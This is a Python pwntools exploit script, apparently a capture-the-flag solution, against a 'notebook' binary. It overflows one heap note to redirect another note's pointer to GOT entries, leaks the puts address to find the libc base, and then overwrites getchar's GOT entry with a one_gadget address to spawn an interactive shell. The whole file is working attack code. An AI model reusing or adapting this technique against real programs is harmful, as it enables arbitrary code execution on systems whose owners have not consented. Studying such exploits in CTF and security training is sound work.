#!/usr/bin/python3

from pwn import *

exe = ELF('notebook', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def add(idx: bytes, payload):
        sla(b"Exit\n", b"1")
        sla(b"> \n", idx)
        sla(b"> \n", payload)
def edit(idx: bytes, payload):
        sla(b"Exit\n", b"2")
        sla(b"> \n", idx)
        sla(b"> \n", payload)

def view():
        sla(b"Exit\n", b"3")
add("0", b'0')
add("1", b'1')
payload = b"a" * 8*3 + p64(0x21) + p64(exe.got.puts)
edit("0", payload)
view()
p.recvline()
p.recv(3)
libc.address = u64(p.recvline(keepends=False) + b"\0\0") - libc.sym.puts
info("libc base: " + hex(libc.address))

one_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]
payload = b"a" * 8*3 + p64(0x21) + p64(exe.got.getchar)
edit("0", payload)
edit("1", p64(libc.address + one_gadget[3]))
sla(b"Exit\n", b"1")
sla(b"> \n", b"0")
p.interactive()
